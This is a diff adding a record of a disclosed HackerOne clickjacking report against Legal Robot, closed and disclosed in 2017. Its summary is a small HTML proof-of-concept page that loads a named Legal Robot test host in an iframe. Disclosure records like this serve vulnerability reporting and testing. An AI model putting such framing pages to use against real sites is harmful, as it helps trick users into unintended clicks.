@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/165542
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/amir0ezat
+ReportedTo:Legal Robot(legalrobot)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:01.09.2017 11:19:25
+
+Summary:
+
+<html>
+   <head>
+     <title>Clickjack test</title>
+   </head>
+   <body>
+     <center><p>Website is vulnerable to clickjacking!</p></center>
+     <center><iframe src="http://mailboxes.legalrobot-uat.com/" width="1000" height="600"></iframe></center>
+   </body>
+</html>
